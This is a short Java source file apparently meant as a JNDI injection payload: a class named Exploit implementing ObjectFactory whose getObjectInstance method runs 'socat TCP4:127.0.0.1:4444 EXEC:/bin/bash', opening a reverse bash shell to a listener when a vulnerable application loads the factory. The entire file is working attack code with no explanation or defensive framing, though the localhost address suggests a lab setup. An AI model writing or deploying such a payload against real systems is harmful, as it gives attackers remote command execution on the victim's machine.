import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.*;
import java.util.Hashtable;
import java.util.Map;

public class Exploit implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            java.lang.Runtime.getRuntime().exec("socat TCP4:127.0.0.1:4444 EXEC:/bin/bash").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return "pwnd";
    }

    public Exploit() {}

    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}